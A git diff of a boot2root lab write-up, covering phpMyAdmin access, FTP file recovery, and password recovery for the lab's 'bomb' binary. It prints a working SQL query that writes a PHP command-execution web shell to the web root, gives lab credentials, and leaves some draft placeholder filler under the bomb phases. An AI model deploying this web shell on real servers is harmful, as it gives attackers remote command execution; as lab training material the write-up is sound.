@@ -119,7 +119,7 @@ We log on the https://192.168.1.76/phpmyadmin page with those credentials, and w
 
 After searching for a bit, we can see that there is a feature that allows us to run SQL queries in the SQL section of the databases.
 
-We found this query that allows us to open a shell in the browser:
+On there : https://github.com/nullbind/Other-Projects/blob/master/random/phpMyAdminWebShell.sql , we found this query that allows us to open a shell in the browser:
 ```SQL
 SELECT "<HTML><BODY><FORM METHOD=\"GET\" NAME=\"myform\" ACTION=\"\"><INPUT TYPE=\"text\" NAME=\"cmd\"><INPUT TYPE=\"submit\" VALUE=\"Send\"></FORM><pre><?php if($_GET['cmd']) {system($_GET[\'cmd\']);} ?> </pre></BODY></HTML>"
 INTO OUTFILE '/var/www/payload.php'
@@ -170,40 +170,110 @@ AllowUsers ft_root zaz thor laurie
 
 ## Step 7 - FTP
 
-We try those credentials on the 21 port, used for FTP and it works.
+We try those credentials on the port 21, used for FTP and it works.
 
+There we see 2 files, fun and README, so we use the **get** command to fetch them on our machine.
+
+```
+➜  laurie git:(main) ✗ file fun
+fun: POSIX tar archive (GNU)
+```
+
+We see that the fun file is actually a **tar** file, so we use `tar -xvf fun` to un-archive them.
+
+When we look at those files, we can see that each file is a little piece of a bigger C file, and if we read them all together with `cat * | less` we can see this function inside:
+
+```c
+int main() {
+        printf("M");
+        printf("Y");
+        printf(" ");
+        printf("P");
+        printf("A");
+        printf("S");
+        printf("S");
+        printf("W");
+        printf("O");
+        printf("R");
+        printf("D");
+        printf(" ");
+        printf("I");
+        printf("S");
+        printf(":");
+        printf(" ");
+        printf("%c",getme1());
+        printf("%c",getme2());
+        printf("%c",getme3());
+        printf("%c",getme4());
+        printf("%c",getme5());
+        printf("%c",getme6());
+        printf("%c",getme7());
+        printf("%c",getme8());
+        printf("%c",getme9());
+        printf("%c",getme10());
+        printf("%c",getme11());
+        printf("%c",getme12());
+        printf("\n");
+        printf("Now SHA-256 it and submit");
+}
+```
+
+So we have to **find the getmes functions** inside those files. Some of these functions are all in the **same files** while some are **split**. In each file, there is **a comment with a number**, that gives us a hint to find the following file.  
+
+We wrote a **script** to facilitate this (see in the *Ressources/ftp* folder), and at the end we get the password for laurie:
+```
+ plain:    Iheartpwnage
+ sha256:   330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4
+```
 
 ---
 
 ## Step 8 - Laurie / The Bomb
 
+We know laurie is an allowed user on the sshd_config file, so we connect ourself on the boot2root vm in ssh with the credentials:   **laurie:330b845f32185747e4f8ca15d40ca59796035c89ea809fb5d30f4da83ecf45a4**  
+
+There we see a binary named **bomb**, and a README with some hints. The bomb has **6 stages**, and **each stage needs a password to get to the next stage**. At the end, **all the passwords combined without spaces** will **form the password** for the user **thor**.
 
 ### Phase 1
 
+ergerg
+
 ### Phase 2
+
+ergegreg
 
 ### Phase 3
 
+rgergerg
+
 ### Phase 4
+
+ergegeg
 
 ### Phase 5
 
+egregeg
+
 ### Phase 6
+
+eergreg
 
 ### Result
 
-```
-PHASE 1: Public speaking is very easy.
-PHASE 2: 1 2 6 24 120 720
-PHASE 3: 1 b 214
-PHASE 4: 9
-PHASE 5: opekmq / opekma
-PHASE 6: 4 2 6 3 1 5
+Here is a summary of the passwords we found for the stages and the thor one at the end:
 
-Publicspeakingisveryeasy.126241207201b2149opekmq426315
+```
+PHASE 1:    Public speaking is very easy.
+PHASE 2:    1 2 6 24 120 720
+PHASE 3:    1 b 214
+PHASE 4:    9
+PHASE 5:    opekmq
+PHASE 6:    4 2 6 3 1 5
+
+PASSWORD:   Publicspeakingisveryeasy.126241207201b2149opekmq426315
 ```
 
-This password doesn't work, and according to slack, we need to change `n-1` with `n-2`, so the password is: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
+However, this password doesn't work, and according to slack, we need to change `n-1` with `n-2`, so the password is: `Publicspeakingisveryeasy.126241207201b2149opekmq426135`
 
 ---
 
